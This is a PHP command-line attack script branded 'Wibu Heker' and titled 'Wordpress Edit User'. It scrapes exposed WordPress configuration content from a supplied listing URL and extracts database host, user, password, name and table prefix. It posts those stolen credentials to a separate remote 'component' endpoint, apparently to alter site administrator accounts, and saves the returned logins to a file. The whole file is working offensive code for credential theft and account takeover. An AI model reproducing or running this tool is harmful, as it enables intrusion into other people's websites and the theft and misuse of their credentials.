<?php
/*
 * @Wibuheker | Wordpress Edit User
 * 
 * This tool build by Wibu Heker.
 * if u want recode, please dont delete copyright.
 * 
 * Copyrigt Wibu Heker.
 * 
 */
error_reporting(0);
require_once 'WibuHeker/Curl.php';
require_once 'WibuHeker/Lib.php';
$lib = new Library();
enterAdminer:
$adminer = readline('[+] Input Component Url: ');
if (empty($adminer))
{
    echo $lib::setColor()['RD'] . "WibuHeker Component url must be not empty!" . $lib::setColor()['WH'] . "\n";
    goto enterAdminer;
}

enterConfig:
$config = readline('[+] Input Config Url: ');
if (empty($config))
{
    echo $lib::setColor()['RD'] . "Config url must be not empty!" . $lib::setColor()['WH'] . "\n";
    goto enterConfig;
}   

$extract = new Curl();
$extract::$URL = $config;
$extract::MakeRequests();
$extract::GET();
preg_match_all('/<a.*?href="(.*?)"/', $extract::Body(), $parts);
$link = $parts[1];
$uriArr = array();
foreach ($link as $ling)
{
    array_push($uriArr, $ling);
}
foreach ($uriArr as $val)
{
    $bjir = $config . $val . "404/";
    if (preg_match("/Wordpress/is", $bjir))
    {
        $extract::$URL = $bjir;
        $extract::MakeRequests();
        $extract::GET();
        if (!$lib::inStr($extract::Body(), 'Wordpress')) echo $lib::setColor()['RD'] . $bjir . " | Failed To Get Data" . $lib::setColor()['WH'] . "\n";
        $body = str_replace('"', "'", $extract::Body());
        $host = $lib::getString($body, "DB_HOST', '", "'");
        $user = $lib::getString($body, "DB_USER', '", "'");
        $pass = $lib::getString($body, "DB_PASSWORD', '", "'");
        $data = $lib::getString($body, "DB_NAME', '", "'");
        preg_match_all("/table_prefix[=\s+'\"]+(.*?)['\"]/m", $extract::Body(), $apa);
        $pref = $apa[1][0];
        $extract::$URL = $adminer;
        $extract::MakeRequests();
        $extract::Follow();
        $extract::POST("host=$host&user=$user&pass=$pass&db=$data&prefix=$pref");
        $js = json_decode($extract::Body(), true);
        if ($js['outcome']) {
            echo $lib::setColor()['GRN'] . $js['login'] . " | " . $js['user'] . " | " . $js['pass'] . $lib::setColor()['WH'] . "\n";
            $lib::Save('wibuheker-edit.txt', $js['login'] . " | " . $js['user'] . " | " . $js['pass']);
        } else {
            echo $lib::setColor()['RD'] . $bjir . " | " . $js['message'] . $lib::setColor()['WH'] . "\n";
        }
    }
}
